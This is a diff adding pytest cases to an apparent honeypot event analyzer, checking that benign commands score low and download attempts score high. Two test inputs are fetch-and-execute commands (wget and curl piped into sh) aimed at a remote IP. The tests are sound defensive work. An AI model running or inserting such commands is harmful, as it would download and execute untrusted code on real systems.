@@ -359,3 +359,22 @@ def test_session_reports_probability_and_method(human_model, model):
     res = a.analyze_session([_ev(t, c) for t, c in [(1, "ls"), (6.5, "cd /var"), (9, "ls -la"), (21, "cat notes"), (24, "whoami")]])
     assert res["human_method"] == "model" and 0 <= res["human_probability"] <= 1
     assert "notes" not in res["human_reason"]   # в пояснение не попадает текст атакующего
+
+
+# ───────────── события агента HoneyForge: тип «payload» ─────────────
+@pytest.mark.parametrize("cmd,low,high", [
+    ("uname -a", 0, 59),                                   # безобидная команда не должна стать «скачиванием» (раньше было 90)
+    ("GET / HTTP/1.1", 0, 59),                             # сырой текст, присланный в TCP-ловушку
+    ("wget http://45.9.148.12/x.sh", 60, 100),             # настоящая попытка скачивания остаётся опасной
+    ("curl -s http://45.9.148.12/x.sh | sh", 60, 100),
+])
+def test_agent_payload_event_is_analysed_as_command(analyzer, cmd, low, high):
+    v = analyzer.analyze_event({"type": "payload", "command": cmd, "src_ip": "1.2.3.4", "session_id": "s1",
+                                "data": {"kind": "download-attempt"}})
+    assert v.kind == "command" and low <= v.threat_score <= high, (cmd, v.kind, v.threat_score)
+
+
+def test_payload_event_with_url_or_hash_is_still_a_download(analyzer):
+    v = analyzer.analyze_event({"event_type": "malware_download", "payload": {"url": "http://x/y", "file_hash": "ab"}})
+    assert v.kind == "download" and v.threat_score >= 90
+    assert analyzer.analyze_event({"type": "payload", "data": {"url": "http://x/y"}}).kind == "download"
